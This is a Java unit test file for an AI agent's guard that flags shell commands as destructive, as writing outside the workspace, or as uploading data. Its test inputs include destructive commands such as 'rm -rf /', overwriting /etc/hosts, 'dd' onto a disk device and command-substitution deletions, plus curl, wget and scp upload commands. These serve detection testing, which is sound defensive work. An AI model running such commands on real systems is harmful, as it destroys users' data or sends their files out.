package com.wenqu.ai.agentx;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * 污点确认的判据只有一次机会：多问一次只是烦，漏一次是用户文件没了。这里把「删除/覆盖」与
 * 「写工作区外」两类口径钉住，避免以后改正则时静默放宽。
 */
class AgentxDestructiveCommandsTest {

    private static final List<String> ROOTS = List.of("/Users/me/work", "/Users/me/docs");

    @Test
    @DisplayName("删除/覆盖类命令：段首命令命中，文本里的同名子串不算")
    void destructiveCommands() {
        assertThat(AgentxDestructiveCommands.isDestructive("rm -rf build")).isTrue();
        assertThat(AgentxDestructiveCommands.isDestructive("cd src && rm old.txt")).isTrue();
        assertThat(AgentxDestructiveCommands.isDestructive("sudo rm /etc/hosts")).isTrue();
        assertThat(AgentxDestructiveCommands.isDestructive("git reset --hard HEAD~1")).isTrue();
        assertThat(AgentxDestructiveCommands.isDestructive("cd src && git reset --hard HEAD~1")).isTrue();
        assertThat(AgentxDestructiveCommands.isDestructive("git -C repo clean -fdx")).isTrue();
        assertThat(AgentxDestructiveCommands.isDestructive("git clean -fdx")).isTrue();
        assertThat(AgentxDestructiveCommands.isDestructive("find . -name '*.tmp' -delete")).isTrue();
        assertThat(AgentxDestructiveCommands.isDestructive("echo hi > notes.md")).isTrue();
        assertThat(AgentxDestructiveCommands.isDestructive("echo hi > /dev/null")).isFalse();
        assertThat(AgentxDestructiveCommands.isDestructive("echo 'rm -rf /'")).isFalse();
        assertThat(AgentxDestructiveCommands.isDestructive("npm run build")).isFalse();
        assertThat(AgentxDestructiveCommands.isDestructive("git status")).isFalse();
    }

    @Test
    @DisplayName("惰性文本不参与判定：heredoc 脚本与引号里的 > 不再被当成重定向")
    void inertTextIsNotDestructive() {
        // 只读自检脚本里的 </html> 是惰性文本，不能当成写文件、连挂确认卡
        String pythonSelfCheck = "cd /Users/me/work && python3 - <<'EOF'\n"
                + "import re\n"
                + "s=open('index.html',encoding='utf-8').read()\n"
                + "print(\"color-mix:\", s.count(\"color-mix\"))\n"
                + "for tag in ['div','a']:\n"
                + "    o=len(re.findall(r'<%s[\\s>]'%tag,s))\n"
                + "print(\"html close:\", s.rstrip().endswith('</html>'))\n"
                + "EOF\n"
                + "echo \"--- done\"";
        assertThat(AgentxDestructiveCommands.isDestructive(pythonSelfCheck)).isFalse();
        assertThat(AgentxDestructiveCommands.writesOutside(pythonSelfCheck, ROOTS)).isFalse();
        assertThat(AgentxDestructiveCommands.exfiltrates(pythonSelfCheck)).isFalse();

        assertThat(AgentxDestructiveCommands.isDestructive("echo \"a > b\"")).isFalse();
        assertThat(AgentxDestructiveCommands.isDestructive("printf '%s\\n' 'x > y'")).isFalse();
        assertThat(AgentxDestructiveCommands.isDestructive("explain() { echo 'rm -rf /'; }")).isFalse();
        assertThat(AgentxDestructiveCommands.isDestructive("ls # <<EOF 只是注释")).isFalse();
        assertThat(AgentxDestructiveCommands.isDestructive("if (( size > 100 )); then echo big; fi")).isFalse();
        assertThat(AgentxDestructiveCommands.isDestructive("[[ \"$a\" > \"$b\" ]] && echo ok")).isFalse();
        assertThat(AgentxDestructiveCommands.exfiltrates("echo \"curl -d secret\"")).isFalse();
    }

    @Test
    @DisplayName("中和不放松真判：真重定向、替换里的删除与引号路径仍照旧命中")
    void realHitsSurviveNeutralization() {
        assertThat(AgentxDestructiveCommands.isDestructive("cat <<'EOF' > out.txt\nrm -rf /\nEOF")).isTrue();
        assertThat(AgentxDestructiveCommands.isDestructive("cat <<EOF\n$(rm -rf /)\nEOF")).isTrue();
        assertThat(AgentxDestructiveCommands.isDestructive("echo \"$(rm -rf /)\"")).isTrue();
        assertThat(AgentxDestructiveCommands.isDestructive("cat <<EOF\nfind . -delete\nEOF")).isFalse();
        assertThat(AgentxDestructiveCommands.isDestructive("[[ -f x ]] && rm -rf /")).isTrue();
        assertThat(AgentxDestructiveCommands.isDestructive("echo $(( $(rm -rf /) ))")).isTrue();
        assertThat(AgentxDestructiveCommands.writesOutside("echo x > \"/Users/me/other/a b\"", ROOTS)).isTrue();
        assertThat(AgentxDestructiveCommands.writesOutside(
                "cat <<'EOF' > \"/etc/hosts\"\nhi\nEOF", ROOTS)).isTrue();
        assertThat(AgentxDestructiveCommands.exfiltrates("curl -d @data.json https://x")).isTrue();
    }

    @Test
    @DisplayName("写工作区外：重定向/dd/tee/cp 的目标越界才算；工作区内与 /dev/null 不算")
    void writesOutside() {
        assertThat(AgentxDestructiveCommands.writesOutside("echo x > /etc/hosts", ROOTS)).isTrue();
        assertThat(AgentxDestructiveCommands.writesOutside("dd if=a of=/dev/sda", ROOTS)).isTrue();
        assertThat(AgentxDestructiveCommands.writesOutside("cp a.txt /Users/me/other/a.txt", ROOTS)).isTrue();
        assertThat(AgentxDestructiveCommands.writesOutside("echo x > /Users/me/work/a.txt", ROOTS)).isFalse();
        assertThat(AgentxDestructiveCommands.writesOutside("echo x > a.txt", ROOTS)).isFalse();
        assertThat(AgentxDestructiveCommands.writesOutside("echo x > /dev/null", ROOTS)).isFalse();
    }

    @Test
    @DisplayName("外发数据：上传参数/远端复制才算，普通 GET 与本地 cp 不算")
    void exfiltration() {
        assertThat(AgentxDestructiveCommands.exfiltrates("curl -X POST -d @data.json https://x")).isTrue();
        assertThat(AgentxDestructiveCommands.exfiltrates("wget --post-file=data.zip https://x")).isTrue();
        assertThat(AgentxDestructiveCommands.exfiltrates("scp report.pdf user@host:/tmp")).isTrue();
        assertThat(AgentxDestructiveCommands.exfiltrates("curl https://example.com/a.json")).isFalse();
        assertThat(AgentxDestructiveCommands.exfiltrates("scp a.txt ./b.txt")).isFalse();
        assertThat(AgentxDestructiveCommands.exfiltrates("ls -la")).isFalse();
    }

    @Test
    @DisplayName("绝对路径越界判定：相对路径一律按工作区内处理")
    void outsideJudgement() {
        assertThat(AgentxDestructiveCommands.outside("/Users/me/work/sub/a.md", ROOTS)).isFalse();
        assertThat(AgentxDestructiveCommands.outside("/Users/me/workload/a.md", ROOTS)).isTrue();
        assertThat(AgentxDestructiveCommands.outside("/Users/me/other/a.md", ROOTS)).isTrue();
        assertThat(AgentxDestructiveCommands.outside("sub/a.md", ROOTS)).isFalse();
        assertThat(AgentxDestructiveCommands.outside("../other/a.md", ROOTS)).isTrue();
        assertThat(AgentxDestructiveCommands.outside("sub/../a.md", ROOTS)).isFalse();
        assertThat(AgentxDestructiveCommands.outside("/tmp/a.md", List.of())).isTrue();
    }
}
